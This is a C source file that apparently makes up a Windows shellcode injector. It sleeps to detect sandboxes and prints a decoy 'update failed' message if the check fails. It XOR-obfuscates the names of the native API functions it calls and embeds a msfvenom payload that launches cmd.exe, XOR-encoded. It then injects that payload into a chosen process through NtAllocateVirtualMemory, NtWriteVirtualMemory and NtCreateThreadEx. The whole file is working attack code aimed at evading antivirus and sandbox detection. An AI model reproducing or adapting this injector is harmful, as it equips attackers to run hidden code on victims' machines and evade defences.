#include <stdio.h>
#include <time.h>
#include <Windows.h>

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _PS_ATTRIBUTE {
    ULONG Attribute;
    SIZE_T Size;
    union {
        ULONG Value;
        PVOID ValuePtr;
    } u1;
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, *PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST
{
    SIZE_T       TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;

typedef NTSTATUS(NTAPI* NAVM)(HANDLE, PVOID, ULONG, PULONG, ULONG, ULONG);
typedef NTSTATUS(NTAPI* NWVM)(HANDLE, PVOID, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* NCT)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);

unsigned char * decrypt(unsigned char *, int, int);

unsigned char * decrypt(unsigned char * data, int dataLen, int xor_key) 
{
	unsigned char * output = (unsigned char *)malloc(sizeof(unsigned char) * dataLen+1);

	for (int i = 0; i < dataLen; i++)
		output[i] = data[i] ^ xor_key;

	return output;
}

int main(int argc, char * argv[])
{
	time_t cur = time(0);
	Sleep(15000);
	time_t aft = time(0);
	if ((aft - cur) < 15)
	{
		puts("update failed");
		exit(0);
	}

	unsigned char * ntdll = decrypt("\x3d\x27\x37\x3f\x3f\x7d\x37\x3f\x3f\x53", 10, 0x53);
	unsigned char * navm = decrypt("\x1d\x27\x12\x3f\x3f\x3c\x30\x32\x27\x36\x05\x3a\x21\x27\x26\x32\x3f\x1e\x36\x3e\x3c\x21\x2a\x53", 24, 0x53);
	unsigned char * nwvm = decrypt("\x1d\x27\x04\x21\x3a\x27\x36\x05\x3a\x21\x27\x26\x32\x3f\x1e\x36\x3e\x3c\x21\x2a\x53", 21, 0x53);
	unsigned char * ncte = decrypt("\x1d\x27\x10\x21\x36\x32\x27\x36\x07\x3b\x21\x36\x32\x37\x16\x2b\x53", 17, 0x53);

	
  // { msfvenom -p windows/x64/exec CMD=cmd.exe EXITFUNC=thread -f c } payload encryped with XOR key 0x53
unsigned char encoded[] = 
"\xaf\x1b\xd0\xb7\xa3\xbb\x93\x53\x53\x53\x12\x02\x12\x03\x01\x02\x05\x1b\x62\x81\x36\x1b"
"\xd8\x01\x33\x1b\xd8\x01\x4b\x1b\xd8\x01\x73\x1b\xd8\x21\x03\x1b\x5c\xe4\x19\x19\x1e\x62"
"\x9a\x1b\x62\x93\xff\x6f\x32\x2f\x51\x7f\x73\x12\x92\x9a\x5e\x12\x52\x92\xb1\xbe\x01\x12"
"\x02\x1b\xd8\x01\x73\xd8\x11\x6f\x1b\x52\x83\xd8\xd3\xdb\x53\x53\x53\x1b\xd6\x93\x27\x34"
"\x1b\x52\x83\x03\xd8\x1b\x4b\x17\xd8\x13\x73\x1a\x52\x83\xb0\x05\x1b\xac\x9a\x12\xd8\x67"
"\xdb\x1b\x52\x85\x1e\x62\x9a\x1b\x62\x93\xff\x12\x92\x9a\x5e\x12\x52\x92\x6b\xb3\x26\xa2"
"\x1f\x50\x1f\x77\x5b\x16\x6a\x82\x26\x8b\x0b\x17\xd8\x13\x77\x1a\x52\x83\x35\x12\xd8\x5f"
"\x1b\x17\xd8\x13\x4f\x1a\x52\x83\x12\xd8\x57\xdb\x1b\x52\x83\x12\x0b\x12\x0b\x0d\x0a\x09"
"\x12\x0b\x12\x0a\x12\x09\x1b\xd0\xbf\x73\x12\x01\xac\xb3\x0b\x12\x0a\x09\x1b\xd8\x41\xba"
"\x04\xac\xac\xac\x0e\x1b\xe9\x52\x53\x53\x53\x53\x53\x53\x53\x1b\xde\xde\x52\x52\x53\x53"
"\x12\xe9\x62\xd8\x3c\xd4\xac\x86\xe8\xb3\x4e\x79\x59\x12\xe9\xf5\xc6\xee\xce\xac\x86\x1b"
"\xd0\x97\x7b\x6f\x55\x2f\x59\xd3\xa8\xb3\x26\x56\xe8\x14\x40\x21\x3c\x39\x53\x0a\x12\xda"
"\x89\xac\x86\x30\x3e\x37\x7d\x36\x2b\x36\x53";

	const unsigned int XOR_KEY = 0x53;
	size_t sc_len = sizeof(encoded)-1; //auto type char array will +1 by default
	unsigned char * shellcode = decrypt(encoded, sc_len, XOR_KEY);
	int newPid = atoi(argv[1]);

    HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, (DWORD)newPid);
    HANDLE tHandle;
    HINSTANCE hNtdll = LoadLibraryA(ntdll);

    NAVM NtAllocateVirtualMemory = (NAVM)GetProcAddress(hNtdll, navm);
    NWVM NtWriteVirtualMemory = (NWVM)GetProcAddress(hNtdll, nwvm);
    NCT NtCreateThreadEx = (NCT)GetProcAddress(hNtdll, ncte);
    void * allocAddr = NULL;
    SIZE_T allocSize = sc_len;
    NTSTATUS status;
    status = NtAllocateVirtualMemory(pHandle, &allocAddr, 0, (PULONG)&allocSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    status = NtWriteVirtualMemory(pHandle, allocAddr, shellcode, sc_len, NULL);
    status = NtCreateThreadEx(&tHandle, GENERIC_EXECUTE, NULL, pHandle, allocAddr, NULL, 0, 0, 0, 0, NULL);
	return 0;
}